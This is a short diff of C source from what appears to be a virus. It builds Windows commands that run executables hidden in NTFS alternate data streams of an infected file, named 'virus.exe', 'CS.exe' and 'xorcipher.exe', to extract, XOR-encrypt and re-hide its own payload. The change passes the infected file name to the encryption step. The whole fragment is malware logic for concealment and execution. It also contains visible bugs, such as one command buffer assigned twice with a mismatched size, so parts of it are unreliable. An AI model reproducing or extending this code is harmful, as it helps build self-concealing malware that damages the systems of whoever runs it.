@@ -11,7 +11,7 @@ int main(int argc, char *argv[]){
     char command1[50], command2[50], command3[50], command4[50], command5[50], command6[50];
     
     snprintf(command1, sizeof(command1), "start /b ./%s:CS.exe %s:virus.exe tmp.exe", infected_file, infected_file); 
-    snprintf(command2, sizeof(command2), "start /b ./%s:xorcipher.exe tmp.exe tmp2.exe", infected_file); 
+    snprintf(command2, sizeof(command2), "start /b ./%s:xorcipher.exe tmp.exe tmp2.exe %s", infected_file, infected_file); 
     snprintf(command3, sizeof(command3), "start /b ./%s:CS.exe tmp2.exe %s:virus.exe", infected_file, infected_file); 
     snprintf(command5, sizeof(command4), "start /b ./%s:virus.exe %s", infected_file, infected_file);
     snprintf(command5, sizeof(command5), "start /b ./%s:CS.exe tmp.exe %s:virus.exe", infected_file, infected_file);
